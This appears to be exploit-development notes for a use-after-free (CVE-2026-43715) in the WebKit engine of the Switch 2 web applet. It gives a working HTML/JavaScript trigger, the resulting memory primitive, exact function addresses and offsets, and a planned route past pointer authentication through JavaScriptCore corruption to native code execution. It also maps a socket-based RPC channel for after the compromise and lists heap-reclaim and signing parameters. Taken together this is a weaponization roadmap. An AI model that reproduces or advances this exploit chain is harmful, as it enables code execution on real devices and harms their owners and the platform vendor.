# WebKit CSSFontFace use-after-free — confirmed, with trigger + primitive + RPC path

Target: the Switch 2 web applet's JetCruiser/NetFront WebKit engine (`BrowserCoreDll`), FW 23.0.x.
The UAF is **present in this build** (`wkc3`); `wkc4` (`libfont`) supplies the synchronous `local()` font
path but is not itself the vulnerable component. This corresponds to **CVE-2026-43715** (CWE-416).

## What it is

`CSSFontFace::setStatus` at `0x71009AE144` snapshots the client list from `CSSFontFace+0x58` and then
invokes virtual slot `+0x18` on each client **without re-checking that the client is still registered**.
Reentrant style/layout during the notification can remove or reassociate the client, leaving the callback
dangling on a freed/reclaimed `CSSFontFace`/`FontFace`. This is the exact pre-fix upstream behavior
(WebKit added a `clients.contains(client)` check before each callback).

## Trigger (reduced, equivalent to the upstream regression)

```html
<style id="invalidate">x {}</style>
<script>
const sheet = document.createElement("style");
sheet.textContent =
  "@font-face { font-family: TriggerFont; src: local(Helvetica); }";
document.head.append(sheet);
document.body.offsetHeight;

const face = [...document.fonts]
  .find(x => x.family.replaceAll(/['"]/g, "") === "TriggerFont");

void face.loaded;

Object.defineProperty(FontFace.prototype, "then", {
  configurable: true,
  get() {
    document.querySelector("#invalidate").remove();
    document.body.offsetHeight;
  }
});

face.load();
</script>
```

`Helvetica` must resolve through the target's local-font mapping (or use another synchronously resolvable
installed name). The sequence is: install `@font-face` → force layout → get the `FontFace` from
`document.fonts` → prime `face.loaded` → install a `FontFace.prototype.then` getter → `face.load()` →
status notification resolves the promise → thenable assimilation runs the getter mid-`setStatus` → getter
invalidates style/layout → the font client is removed/reassociated → control returns to the stale snapshot.

## Primitive (what the stale path gives)

On a reclaimed `CSSFontFace`:

- read `status` at `+0x7A`
- read source count at `+0x4C`
- read source-vector pointer at `+0x40`
- dereference source state at `source+0x50`
- **fixed-value one-byte write** at stale `+0x7A`
- traverse the client container at `+0x58`
- **virtual dispatch** through client slot `+0x18`

So: **heap UAF → stale structured reads → fixed-offset one-byte write → possible virtual-call type
confusion.** It is *not yet* a demonstrated general arbitrary write.

## PAC constraint (the remaining step)

The virtual call is PAC-protected (`autda` + `blraa`), so spraying an unsigned fake vtable fails. The viable
route is: reclaim the freed allocation with an object carrying a **legitimate signed vptr**, then use the
stale accesses to corrupt a JSC object (e.g. a typed-array / backing-store descriptor) → JSC arbitrary
read/write → resolve module addresses → reuse JSC's executable/JIT memory → transfer control. The unresolved
piece is a reliable same-size reclaim + a PAC-valid victim type — **not the UAF itself**.

## RPC viability (after native code execution)

`SystemWeb`/`LibAppletWeb` already link the BSD sockets (`nn::socket::{Socket,Connect,Send,Recv,Bind,
Listen,Accept,Poll}`); `SystemWeb` init at `FUN_006A5290` opens `bsd:s`, falling back to `bsd:a`/`bsd:u`.
So once native execution is achieved inside the applet, a host TCP RPC for the applet's own CPU/memory and
permitted IPC is statically available. This does **not** by itself grant other-process memory, kernel access,
or services outside the applet's NPDM allow-list.

## Exact function map (BrowserCoreDll__wkc3-aarch64.elf, base 0x7100000000)

| Address | Role |
|---|---|
| `0x71009ACA98` | `CSSFontFace` destructor/teardown |
| `0x71009ADF50` | `CSSFontFace::load` source-selection worker |
| `0x71009AE144` | **vulnerable `CSSFontFace::setStatus`** |
| `0x71009AE3D0` | `CSSFontFace::removeClient` |
| `0x71009AE7C8` | `CSSFontFace::load` wrapper |
| `0x71009EE314` | `FontFace` backing-face reassociation/replacement |
| `0x71009EE3D4` / `…3E0` | old-face destructor / heap-free (`0x7101951150`) |
| `0x71009EE58C` | `CSSFontFaceClient` callback thunk into `FontFace` |
| `0x71009EE594` | `FontFace::load` |
| `0x71009EF78C` | `FontFaceSet::load` |
| `0x7100D40F00` | JS binding `FontFace.load` (native call `…F24`) |
| `0x7100D44548` | JS binding `FontFaceSet.load` (native call `…610`) |

Secondary lead: `FontFaceSet::load` keeps a raw `CSSFontFace*` vector without per-element refcounts and
revisits each entry's status — a raw-vector UAF that is statically present but not yet runtime-validated.

## Artifacts

- Ghidra project: `/data/ghidra-projects/webkit-wkc-targeted.gpr`
- Program: `/BrowserCoreDll__wkc3-aarch64.elf`
- Decompile: `/data/samples/webkit-analysis/wkc3-cssfontface-targets.c`

## Proven vs not-yet

- ✅ UAF present in this build; trigger + exact vulnerable function + primitive mapped.
- ✅ Upstream fix confirmed (the missing `clients.contains` re-check).
- ⏳ Native code execution: needs a PAC-valid same-size reclaim + a JSC corruption victim.
- ⏳ Runtime validation on real hardware (heap timing).


# Reclaim inputs

module_hash: 8706796b12fef399ac1890ab1ec9eaf62b99718b0bc42f4c88430477ba1d7df6 (file 040000000000085d/exefs/wkc3, build_id 40ac5a64c4c56a1efbf46d60aaa3aac9d452c389)
sizeof_CSSFontFace: 0xb8 @0x9ac7d8 (mov w0,#0xb8 @0x9ac7d8; bl 0x3ab668 @0x9ac7dc; ctor 0x9ac884 @0x9ac7f4)
allocator: 0x3ab668 (fastMalloc wrapper; calls 0x1951180, fallback 0x194c608) — 0x3ab668 itself @file 0x3ab668
gcage_on: unknown — 7 "Gigacage" strings in ro; tryMalloc xref not yet resolved
pseudo_allocator_overrides_fastmalloc: no in wkc3 — "WkcMallocFreePseudoAllocator" has 0 hits in wkc3 ro/data/text; check systemweb/openweb imports
spray_primitive: TBD (A4)
client_implementors: TBD (A6)
fontface_slot18_ok: TBD (A7)
autda_pair: ldr x16,[client]; movk x17,#0xb64f,lsl#48; autda x16,x17; ldr x8,[x16,#0x18]!; movk x16,#0x4cdf,lsl#48; blraa x8,x16 @0x9ae1f8..0x9ae224
vtable_slot_called: +0x18 (status callback, @0x9ae218); second call at +0x30 (@0x9ae1b8, no args)
signed_ptr_sample: runtime-only — autda modifier is client|0xb64f000000000000 (address-derived); a captured pointer only replays at the same client address
leak_getter: TBD (C1)
status_write: 0x9ae238 `strb w20,[x19,#122]` (this+0x7A = new status), values 0..4
client_base_cached: begins from this+0x58 each call (`add x0,x19,#0x58; bl 0x73b950` @0x9ae178 and @0x9ae274); iterator begin/end returned, base not cached across calls
ctor_pacda: 0x9ac974 `pacda x16,x17` with x17 = object|0xcea0<<48 — this build signs vtables, unlike chat/ldn
